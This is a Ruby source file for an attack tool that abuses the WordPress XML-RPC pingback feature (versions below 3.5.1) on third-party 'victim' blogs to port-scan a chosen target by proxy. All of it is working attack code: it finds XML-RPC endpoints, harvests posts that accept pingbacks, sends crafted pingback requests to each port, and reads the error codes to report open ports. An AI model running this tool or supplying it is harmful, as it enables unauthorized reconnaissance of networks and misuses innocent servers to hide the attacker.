#!/usr/bin/env ruby

require 'optparse'
require 'typhoeus'
require 'uri'
require 'ostruct'

class Array
  alias_method :sample, :choice unless method_defined?(:sample)
end

def colorize(text, color_code)
  "\e[#{color_code}m#{text}\e[0m"
end

def red(text)
  colorize(text, 31)
end

def green(text)
  colorize(text, 32)
end

def yellow(text)
  colorize(text, 33)
end

def logo
  puts
  puts '   _      __            __                       ___  _           __            __'
  puts '  | | /| / /__  _______/ /__  _______ ___ ___   / _ \\(_)__  ___ _/ /  ___ _____/ /__'
  puts '  | |/ |/ / _ \\/ __/ _  / _ \\/ __/ -_|_-<(_-<  / ___/ / _ \\/ _ `/ _ \\/ _ `/ __/  \'_/'
  puts '  |__/|__/\\___/_/  \\_,_/ .__/_/  \\__/___/___/ /_/  /_/_//_/\\_, /_.__/\\_,_/\\__/_/\\_\\'
  puts '     ___           __  /_/___                              /___/'
  puts '    / _ \\___  ____/ /_  / __/______ ____  ___  ___ ____'
  puts '   / ___/ _ \\/ __/ __/ _\\ \\/ __/ _ `/ _ \\/ _ \\/ -_) __/'
  puts '  /_/   \\___/_/  \\__/ /___/\\__/\\_,_/_//_/_//_/\\__/_/'
  puts
  puts yellow('Warning: this tool only works with Wordpress versions < 3.5.1')
  puts yellow('To determine your Wordpress version you can use WPScan http://wpscan.org/')
  puts
end

def generate_pingback_xml (target, valid_blog_post)
  xml = '<?xml version="1.0" encoding="iso-8859-1"?>'
  xml << '<methodCall>'
  xml << '<methodName>pingback.ping</methodName>'
  xml << '<params>'
  xml << "<param><value><string>#{target}</string></value></param>"
  xml << "<param><value><string>#{valid_blog_post}</string></value></param>"
  xml << '</params>'
  xml << '</methodCall>'
  xml
end

def xml_rpc_url_from_headers(url)
  resp = Typhoeus::Request.head(url,
                                :followlocation => true,
                                :maxredirs => 10,
                                :timeout => 5000,
                                :headers => {'User-Agent' => @options.useragent}
  )
  headers = resp.headers_hash
  # Provided by header? Otherwise return nil
  headers['x-pingback']
end

def xml_rpc_url_from_body(url)
  resp = Typhoeus::Request.get(url,
                               :followlocation => true,
                               :maxredirs => 10,
                               :timeout => 5000,
                               :headers => {'User-Agent' => @options.useragent}
  )
  # Get URL from body, return nil if not present
  resp.body[%r{<link rel="pingback" href="([^"]+)" ?\/?>}, 1]
end

def xml_rpc_url_from_default(url)
  url = get_default_xmlrpc_url(url)
  resp = Typhoeus::Request.get(url,
                               :followlocation => true,
                               :maxredirs => 10,
                               :timeout => 5000,
                               :headers => {'User-Agent' => @options.useragent}
  )
  return url if resp.code == 200 and resp.body =~ /XML-RPC server accepts POST requests only./
  nil
end

def get_xml_rpc_url(url)
  xmlrpc_url = xml_rpc_url_from_headers(url)
  if xmlrpc_url.nil? or xmlrpc_url.empty?
    xmlrpc_url = xml_rpc_url_from_body(url)
    if xmlrpc_url.nil? or xmlrpc_url.empty?
      xmlrpc_url = xml_rpc_url_from_default(url)
      if xmlrpc_url.nil? or xmlrpc_url.empty?
        raise("Url #{url} does not provide a XML-RPC url")
      end
      puts 'Got default XML-RPC Url' if @options.verbose
    else
      puts 'Got XML-RPC Url from Body' if @options.verbose
    end
  else
    puts 'Got XML-RPC Url from Headers' if @options.verbose
  end
  xmlrpc_url
end

def get_default_xmlrpc_url(url)
  uri = URI.parse(url)
  uri.path << '/' if uri.path[-1] != '/'
  uri.path << 'xmlrpc.php'
  uri.to_s
end

def get_pingback_request(xml_rpc, target, blog_post)
  pingback_xml = generate_pingback_xml(target, blog_post)
  Typhoeus::Request.new(xml_rpc,
                        :followlocation => true,
                        :maxredirs => 10,
                        :timeout => 10000,
                        :method => :post,
                        :body => pingback_xml,
                        :headers => {'User-Agent' => @options.useragent}
  )
end

def get_valid_blog_post(xml_rpcs)
  blog_posts = []
  xml_rpcs.each do |xml_rpc|
    url = xml_rpc.sub(/\/xmlrpc\.php$/, '')
    # Get valid URLs from Wordpress Feed
    feed_url = "#{url}/?feed=rss2"
    params = {:followlocation => true, :maxredirs => 10, :headers => {'User-Agent' => @options.useragent}}
    response = Typhoeus::Request.get(feed_url, params)
    links = response.body.scan(/<link>([^<]+)<\/link>/i)
    if response.code != 200 or links.nil? or links.empty?
      raise("No valid blog posts found for xmlrpc #{xml_rpc}")
    end
    links.each do |link|
      temp_link = link[0]
      puts "Trying #{temp_link}.." if @options.verbose
      # Test if pingback is enabled for extracted link
      pingback_request = get_pingback_request(xml_rpc, 'http://www.google.com', temp_link)
      @hydra.queue(pingback_request)
      @hydra.run
      pingback_response = pingback_request.response
      # No Pingback for post enabled: <value><int>33</int></value>
      pingback_disabled_match = pingback_response.body.match(/<value><int>33<\/int><\/value>/i)
      if pingback_response.code == 200 and pingback_disabled_match.nil?
        puts "Found valid post under #{temp_link}"
        blog_posts << {:xml_rpc => xml_rpc, :blog_post => temp_link}
        break
      end
    end
  end

  if blog_posts.nil? or blog_posts.empty?
    raise('No valid posts with pingback enabled found')
  end

  blog_posts
end

def is_port_open?(response)
  # see wp-includes/class-wp-xmlrpc-server.php#pingback_ping($args) for error codes
  # open 17: The source URL does not contain a link to the target URL, and so cannot be used as a source.
  # open 32: We cannot find a title on that page.
  # closed 16: The source URL does not exist.
  open_match = response.body.match(/<value><int>(17|32)<\/int><\/value>/i)
  return true if response.code == 200 and open_match
  false
end

def generate_requests(xml_rpcs, target)
  port_range = @options.all_ports ? (0...65535) : @options.ports
  port_range.each do |i|
    random = (0...8).map { 65.+(rand(26)).chr }.join
    xml_rpc_hash = xml_rpcs.sample
    uri = URI(target)
    uri.port = i
    uri.scheme = i == 443 ? 'https' : 'http'
    uri.path = "/#{random}/"
    pingback_request = get_pingback_request(xml_rpc_hash[:xml_rpc], uri.to_s, xml_rpc_hash[:blog_post])
    pingback_request.on_complete do |response|
      if is_port_open?(response)
        puts green("Port #{i} is open")
      else
        puts yellow("Port #{i} is closed")
      end
      if @options.verbose
        puts "URL: #{uri.to_s}"
        puts "XMLRPC: #{xml_rpc_hash[:xml_rpc]}"
        puts 'Request:'
        puts pingback_request.options[:body]
        puts "Response Code: #{response.code}"
        puts response.body
        puts '##################################'
      end
    end
    @hydra.queue(pingback_request)
  end
end

begin
  logo

  xml_rpcs = []

  @options = OpenStruct.new
  @options.target = 'http://localhost'
  @options.all_ports = false
  @options.ports = [21, 22, 25, 53, 80, 106, 110, 143, 443, 3306, 3389, 8443, 9999]
  @options.verbose = false
  @options.useragent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0'

  opt_parser = OptionParser.new do |opts|
    opts.banner = "Usage: ruby #{opts.program_name}.rb [OPTION] ... VICTIMS"
    opts.version = '2.0'

    opts.separator ''
    opts.separator 'Specific options:'

    opts.on('-t', '--target TARGET', 'the target to scan - default localhost') do |value|
      if value !~ /^http/
        @options.target = "http://#{value}"
      else
        @options.target = value
      end
    end

    opts.on('-u', '--user-agent USERAGENT', 'send custom User-Agent header') do |value|
      @options.useragent = value
    end

    opts.on('-a', '--all-ports', 'Scan all ports. Default is to scan only some common ports') do |value|
      @options.all_ports = value
    end

    opts.on('-p', '--ports PORTS', 'Scan given ports. Comma separated list and ranges are allowed, e.g. 80,8080,25-30') do |value|
      ports = value.split(',')
      ports.map! {|x| x.split('-')}
      ports.map! {|x| x.length > 1 ? (x[0]..x[1]).to_a : x}
      @options.ports =  ports.flatten.uniq.map{|x| x.to_i}
    end

    opts.on('-v', '--verbose', 'Enable verbose output') do |value|
      @options.verbose = value
    end

    opts.on('-d', '--debug', 'Enable debug output') do |value|
      Typhoeus::Config.verbose = value
    end

    opts.separator ''
    opts.separator 'VICTIMS: a space separated list of victims to use for scanning (must provide a XML-RPC Url)'
    opts.separator "Currently defined common ports: #{@options.ports.join(', ')}"
    opts.separator ''

  end

  opt_parser.parse!(ARGV)

  if ARGV.empty?
    puts opt_parser
    exit(-1)
  end

  # Parse XML RPCs
  ARGV.each do |site|
    url_cleanup = site.sub(/\/xmlrpc\.php$/i, '/')
    # add trailing slash
    url_cleanup =~ /\/$/ ? url_cleanup : "#{url_cleanup}/"
    xml_rpcs << get_xml_rpc_url(url_cleanup)
  end

  if xml_rpcs.nil? or xml_rpcs.empty?
    raise('No valid XML-RPC interfaces found')
  end

  @hydra = Typhoeus::Hydra.new(:max_concurrency => 10)

  puts 'Getting valid blog posts for pingback...'
  hash = get_valid_blog_post(xml_rpcs)
  puts 'Starting portscan...'
  generate_requests(hash, @options.target)
  @hydra.run
rescue => e
  puts red("[ERROR] #{e.message}")
  puts red('Trace :')
  puts red(e.backtrace.join("\n"))
end
